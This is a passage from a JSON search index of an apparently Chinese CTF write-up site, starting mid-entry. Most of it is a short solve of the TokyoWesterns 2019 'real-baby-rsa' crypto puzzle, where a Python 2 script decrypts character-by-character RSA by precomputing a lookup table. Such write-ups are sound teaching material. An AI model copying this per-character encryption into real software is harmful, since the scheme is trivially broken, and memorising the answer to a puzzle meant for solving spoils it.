\u60ca\u4e86\u3002\u6ca1\u6743\u9650","title":"calc"},{"location":"writeup/tokyoctf2019/#real-baby-rsa","text":"\u8bf4\u8d77\u6765\u867d\u7136\u662f\u4e00\u9053\u5f88\u7b80\u5355\u7684\u9898\u76ee\u4f46\u662f\u6211\u8fd8\u662f\u5b66\u4e60\u5230\u4e86\u5f88\u591a \u9996\u5148\u8bd5RSA\u7684\u52a0\u5bc6\u7b97\u6cd5\uff0c\u6700\u8fd1web\u9898\u76ee\u9047\u5230\u4e86\u5f88\u591a\u7684\u5bc6\u7801\u5b66\u7684\u9898\u76ee\uff0c\u6240\u4ee5web\u72d7\u4e5f\u5f00\u59cb\u505a\u8d77\u4e86\u5bc6\u7801\u5b66 \u8bf4\u8d77\u6765\u4e5f\u633a\u7b80\u5355\u7684\u5c31\u662f\u53bb\u7a77\u4e3e\u6240\u6709\u7684\u53ef\u80fd\u56e0\u4e3a\u8fd9\u4e2a\u9898\u76ee\u4e0d\u77e5\u9053\u79c1\u94a5\uff0c\u8bdd\u8bf4\u79c1\u94a5\u7b97\u4e0d\u51fa\u6765\u5417\uff1f 1 2 3 4 5 6 7 8 9 import string d = {} # \u751f\u6210\u4e00\u4e2a\u5b57\u5178\u5b58\u7740\u6240\u6709\u7684\u53ef\u89c1\u5b57\u7b26\u548c\u5bf9\u5e94\u7684\u52a0\u5bc6\u540e\u7684\u503c n = 36239973541558932215768154398027510542999295460598793991863043974317503405132258743580804101986195705838099875086956063357178601077684772324064096356684008573295186622116931603804539480260180369510754948354952843990891989516977978839158915835381010468654190434058825525303974958222956513586121683284362090515808508044283236502801777575604829177236616682941566165356433922623572630453807517714014758581695760621278985339321003215237271785789328502527807304614754314937458797885837846005142762002103727753034387997014140695908371141458803486809615038309524628617159265412467046813293232560959236865127539835290549091 e = 65537 for i in string . printable : d [ pow ( ord ( i ), e , n )] = i print '' . join ([ d [ int ( i )] for i in open ( 'output' ) . read () . split ( ' \\n ' )[: - 1 ]])","title":"real-baby-rsa"},{"location":"writeup/tokyoctf2019/#_1","text":"","title":"\u53c2\u8003"}]}